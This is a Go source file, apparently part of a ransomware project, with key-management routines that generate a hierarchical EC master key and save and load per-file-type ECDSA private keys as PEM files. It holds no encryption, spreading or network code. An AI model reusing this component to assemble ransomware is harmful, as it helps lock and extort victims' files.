package eccLib

import (
	"bufio"
	"crypto/ecdsa"
	"crypto/rand"
	"encoding/binary"
	"encoding/pem"
	"os"
	"ransomware/utils"
)

func GenerateMasterPrivKey() *ExtendedPrivateKey {

	seed := make([]byte, 32)
	rand.Read(seed)

	I := utils.ComputeHmac512(seed, []byte("Extended EC key"))

	Il, Ir := I[:32], I[32:]

	key := &ExtendedPrivateKey{
		ChainCode:  Ir,
		PrivateKey: *NewPrivateKey(utils.Parse256(Il)),
		Index:      0,
	}
	return key
}

func SerializeExtendedPrivateKey(extPrivKey ExtendedPrivateKey) []byte {

	privKeyBytes := make([]byte, 32)
	extPrivKey.PrivateKey.D.FillBytes(privKeyBytes)

	iBytes := utils.Serialize16Int(extPrivKey.Index)

	out := append(iBytes, privKeyBytes...)
	out = append(out, extPrivKey.ChainCode...)

	return out
}

func DeserializeExtendedPrivateKey(data []byte) (*ExtendedPrivateKey, error) {

	iBytes, privKeyBytes, chainCode := data[:2], data[2:34], data[34:]

	privKey := NewPrivateKey(utils.Parse256(privKeyBytes))

	extChildPrivKey := &ExtendedPrivateKey{
		ChainCode:  chainCode,
		PrivateKey: *privKey,
		Index:      binary.BigEndian.Uint16(iBytes),
	}

	return extChildPrivKey, nil
}

func SerializePrivKey(privKey *ecdsa.PrivateKey) []byte {

	privKeyBytes := make([]byte, 32)
	privKey.D.FillBytes(privKeyBytes)

	return privKeyBytes
}

func DeserializePrivKey(data []byte) (*ecdsa.PrivateKey, error) {

	privKey := NewPrivateKey(utils.Parse256(data))

	return privKey, nil
}

func StoreExtPrivateKey(path string, extPrivKey *ExtendedPrivateKey) error {

	pemPrivateFile, err := os.Create(path)
	if err != nil {
		return err
	}

	pemPrivateBlock := &pem.Block{
		Type:  "EC EXTENDEND PRIVATE KEY",
		Bytes: SerializeExtendedPrivateKey(*extPrivKey),
	}

	err = pem.Encode(pemPrivateFile, pemPrivateBlock)
	if err != nil {
		return err
	}
	err = pemPrivateFile.Close()
	if err != nil {
		return err
	}

	return nil
}

func ReadExtPrivateKey(filePath string) (*ExtendedPrivateKey, error) {
	privateKeyFile, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}

	pemFileInfo, err := privateKeyFile.Stat()
	if err != nil {
		return nil, err
	}
	size := pemFileInfo.Size()

	pemBytes := make([]byte, size)
	buffer := bufio.NewReader(privateKeyFile)
	buffer.Read(pemBytes)
	data, _ := pem.Decode([]byte(pemBytes))
	privateKeyFile.Close()

	extPrivKey, err := DeserializeExtendedPrivateKey(data.Bytes)
	if err != nil {
		return nil, err
	}

	return extPrivKey, nil
}

func StoreMultPrivKeys(path string, extPrivKeys []*ecdsa.PrivateKey) error {

	var i int
	var privKey *ecdsa.PrivateKey

	pemPrivateFile, err := os.Create(path)
	if err != nil {
		return err
	}

	for i = 0; i < len(extPrivKeys); i++ {

		privKey = extPrivKeys[i]
		if privKey != nil {

			pemPrivateBlock := &pem.Block{
				Type:  "EC PRIVATE KEY",
				Bytes: SerializePrivKey(privKey),
			}

			if err = pem.Encode(pemPrivateFile, pemPrivateBlock); err != nil {
				return err
			}

		} else {
			pemPrivateFile.WriteString("/\n")
		}

	}

	err = pemPrivateFile.Close()
	if err != nil {
		return err
	}

	return nil
}

func ReadMultPrivKeys(filePath string) ([]*ecdsa.PrivateKey, error) {

	var data *pem.Block

	childsNumber := utils.FileTypeLenght
	keys := make([]*ecdsa.PrivateKey, childsNumber)

	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}

	pemFileInfo, err := file.Stat()
	if err != nil {
		return nil, err
	}
	size := pemFileInfo.Size()

	pemBytes := make([]byte, size)
	buffer := bufio.NewReader(file)
	buffer.Read(pemBytes)

	for i := 0; i < childsNumber; i++ {

		if pemBytes[0] != '/' {
			data, pemBytes = pem.Decode([]byte(pemBytes))

			keys[i], err = DeserializePrivKey(data.Bytes)
			if err != nil {
				file.Close()
				return nil, err
			}
		} else {
			keys[i] = nil
			pemBytes = pemBytes[2:]
		}
	}

	file.Close()

	return keys, nil
}
